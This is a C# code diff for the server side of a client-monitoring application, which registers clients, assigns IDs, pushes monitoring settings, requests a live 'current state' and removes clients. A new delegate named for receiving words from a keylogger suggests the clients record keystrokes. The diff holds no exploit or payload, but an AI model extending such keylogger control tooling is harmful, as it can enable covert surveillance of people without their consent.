@@ -11,9 +11,11 @@ using IWshRuntimeLibrary;
 
 namespace ServerSide
 {
-    
+
+    public delegate void wordFromKeylogger(string word);
     public delegate void playCurrentState(int id);
     public delegate void stopCurrentState(int id);
+    public delegate void RemoveClient(int id);
     class Program
     {
         private List<Client> Allclients;
@@ -21,7 +23,7 @@ namespace ServerSide
         private Socket clientSocket; // We will only accept one socket.
         private byte[] buffer;
         public MonitorSetting monitorSystem;
-       
+        private List<int> clientIds = new List<int>();
         public DBserver dbs;
         private int numOfClient;
         private String name;
@@ -77,8 +79,6 @@ namespace ServerSide
 
                 }
 
-
-
             }
             catch (SocketException ex)
             {
@@ -120,7 +120,14 @@ namespace ServerSide
             try
             {
                 clientSocket = AR.AsyncState as Socket;
-                clientSocket.EndSend(AR);
+                foreach (Client client in program.Allclients)
+                {
+                    if (clientSocket == client.ClientSocket) {
+                        client.ClientSocket.EndSend(AR);
+                    }
+                }
+            //ShowErrorDialog("sendCallback to socket: "+ clientSocket.RemoteEndPoint);
+               
 
 
             }
@@ -205,13 +212,14 @@ namespace ServerSide
                 {
                     return;
                 }
+                
                 // find the buffer that get data from client
                 foreach (Client client in Allclients)
                 {
                     if (client.ClientSocket == CurrentClientSocket)
                     {
-                         buffer = client.buffer;
-                         client.buffer = new byte[client.ClientSocket.ReceiveBufferSize];
+                        buffer = client.buffer;
+                        client.buffer = new byte[client.ClientSocket.ReceiveBufferSize];
 
                         // Start receiving data from this client Socket.
                         client.ClientSocket.BeginReceive(client.buffer, 0, client.buffer.Length, SocketFlags.None, this.ReceiveCallback, client.ClientSocket);
@@ -219,15 +227,17 @@ namespace ServerSide
                     }
                 }
                 string data = Encoding.UTF8.GetString(buffer);
-                ShowErrorDialog("get data in sokcet: \n" + CurrentClientSocket.RemoteEndPoint + "\nData from client is:\n"+ data);
-                var dataFromClient = data.Split(new[] { '\r','\0', '\n' }, 2);
+                ShowErrorDialog("get data in sokcet: \n" + CurrentClientSocket.RemoteEndPoint + "\nData from client is:\n" + data);
+                var dataFromClient = data.Split(new[] { '\r', '\0', '\n' }, 2);
+
+                // client send name at first time
                 if (dataFromClient[0] == "name")
                 {
                     name = dataFromClient[1];
                     String[] SplitedMessage = name.Split('\0');
                     name = SplitedMessage[0];
 
-                    ShowErrorDialog("|" + name + "|");
+                    //ShowErrorDialog("|" + name + "|");
                     String Setting = "";
                     // set system 
                     monitorSystem = new MonitorSetting(name);
@@ -241,53 +251,53 @@ namespace ServerSide
                     while (openMonitorSetting.IsAlive) ;
                     Setting = monitorSystem.setting; // get Setting from monitorSystem form
                                                      // ShowErrorDialog("Setting: \n"+Setting);
-
-                    // create new client 
-                    Client newClient = new Client(name, numOfClient, CurrentClientSocket, buffer);
-
+                    int newId = createNewId();
+                    // create new client
+                    Client newClient = new Client(name, newId, CurrentClientSocket, buffer);
                     Allclients.Add(newClient);
-
-                    // write new client to Data base 
-                    dbs.fillClientsTable(numOfClient, name, Setting);
+                    clientIds.Add(newId);
+                    // write new client to Data base
+                    dbs.fillClientsTable(newId, name, Setting);
                     // Send Id to Client
-                    sendDataToClient(CurrentClientSocket, "id\r" + numOfClient);
-
+                    sendDataToClient(CurrentClientSocket, "id\r" + newId);
                     // send Setting to new Client
                     String set = "setting\r\n" + Setting;
                     sendDataToClient(CurrentClientSocket, set);
 
+                    int index = 0;
                     // Start receiving data from this client Socket.
-                    Allclients[numOfClient].ClientSocket.BeginReceive(Allclients[numOfClient].buffer, 0, Allclients[numOfClient].buffer.Length, SocketFlags.None, this.ReceiveCallback, Allclients[numOfClient].ClientSocket);
-
+                    for (int i = 0; i < Allclients.Count; i++)
+                    {
+                        if (Allclients[i].id == newId)
+                            index = i;
+                    }
+                    Allclients[index].ClientSocket.BeginReceive(Allclients[index].buffer, 0, Allclients[index].buffer.Length, SocketFlags.None, this.ReceiveCallback, Allclients[index].ClientSocket);
                     s.addClientToCheckBoxLst(newClient.Name, newClient.id, newClient.ClientSocket);
                     numOfClient++;
 
                 }
 
+                // client send id to connect or reconnect
                 if (dataFromClient[0] == "id")
                 {
                     reConnectSocket(CurrentClientSocket, dataFromClient[1]);
 
                 }
-                if (dataFromClient[0] == "current state") {
-                    //int CID = Int32.Parse(dataFromClient[0].Split('\0')[0]);
-                    // dataFromClient[1].Split('\0')[0]
+                
+                // client send data in live
+                if (dataFromClient[0] == "current state") {                     
                     foreach (Client client in Allclients)
                     {
                         if (client.ClientSocket == CurrentClientSocket)
                         {
-                           client.openCurrentStateForm(dataFromClient[1].Split('\0')[0]);
+                            // the function open form to disply data from client
+                            client.openCurrentStateForm(dataFromClient[1].Split('\0')[0]);
+
                         }
                     }
                           
 
                 }
-
-
-                
-
-
-
 
             }
             // Avoid Pokemon exception handling in cases like these.
@@ -300,7 +310,17 @@ namespace ServerSide
                 ShowErrorDialog(ex.Message);
             }
         }
-
+        private int createNewId()
+        {
+            int newId = 0;
+            while (true)
+            {
+                if (clientIds.Contains(newId))
+                    newId++;
+                else
+                    return newId;
+            }
+        }
         private void reConnectSocket(Socket current,string id)
         {
             int CID = Int32.Parse(id.Split('\0')[0]);
@@ -323,15 +343,18 @@ namespace ServerSide
 
         public void sendDataToClient(Socket ClientSocket, string data)
         {
-            if (ClientSocket != null)
-            {
-                var sendSetting = Encoding.ASCII.GetBytes(data);
-                ClientSocket.BeginSend(sendSetting, 0, sendSetting.Length, SocketFlags.None, SendCallback, clientSocket);
+            foreach (Client client in program.Allclients) {
+                if (client.ClientSocket == ClientSocket && client.ClientSocket != null) {
+                    client.buffer = Encoding.ASCII.GetBytes(data);
+                    client.ClientSocket.BeginSend(client.buffer, 0, client.buffer.Length, SocketFlags.None, SendCallback, client.ClientSocket);
+                }
+                else
+                {
+                    // wait to connect from client
+                    // ShowErrorDialog("cannot send data to client in socket null");
+                }
             }
-            else {
-                // wait to connect from client
-                ShowErrorDialog("cannot send data to client in socket null");
-            }
+            
             
         }
         public static void ShowErrorDialog(string message)
@@ -346,9 +369,11 @@ namespace ServerSide
             if (id < program.Allclients.Count) { 
                 
                 Socket clientSocket = program.Allclients[id].ClientSocket;
-                program.sendDataToClient(clientSocket, "get current state");
-                ShowErrorDialog("DelegateMethod play, id is: "+ id );
-                s.enabledbtnGetCurrentState(false);
+                program.sendDataToClient(program.Allclients[id].ClientSocket, "get current state");
+                ShowErrorDialog("DelegateMethod play, id is: " + id + ", in Socket: " + clientSocket.RemoteEndPoint);
+                program.Allclients[id].openCurrentStateForm("open CurrentState form");
+
+                //s.enabledbtnGetCurrentState(false);
             }
          
         }
@@ -356,14 +381,44 @@ namespace ServerSide
         {
             if (id < program.Allclients.Count)
             {
-               
                 Socket clientSocket = program.Allclients[id].ClientSocket;
-                program.sendDataToClient(clientSocket, "stop current state");
+                program.sendDataToClient(program.Allclients[id].ClientSocket, "stop current state");
                 ShowErrorDialog("in stopCurrentState: " + id); 
-                s.enabledbtnGetCurrentState(true);
+                //s.enabledbtnGetCurrentState(true);
             }
            
 
+        }
+        public static void removeClient(int id)
+        {
+            for (int i = 0; i < program.Allclients.Count(); i++)
+            {
+                if (program.Allclients[i].id == id)
+                {
+                    Socket clientSocket = program.Allclients[i].ClientSocket;
+                    program.sendDataToClient(program.Allclients[i].ClientSocket, "remove client");
+                    
+                }
+            }
+            
+            program.clientIds.Remove(id);
+            s.removeClientFromCheckBoxLst(id);
+
+            program.dbs.removeClient(id.ToString());
+            program.removeClientfromMemory(id.ToString());
+
+            
+             
+        }
+        private void removeClientfromMemory(string id)
+        {
+            for (int i = 0; i < Allclients.Count(); i++)
+            {
+                if (Allclients[i].id.ToString() == id)
+                {
+                    Allclients.Remove(Allclients[i]);
+                }
+            }
         }
     }
 }
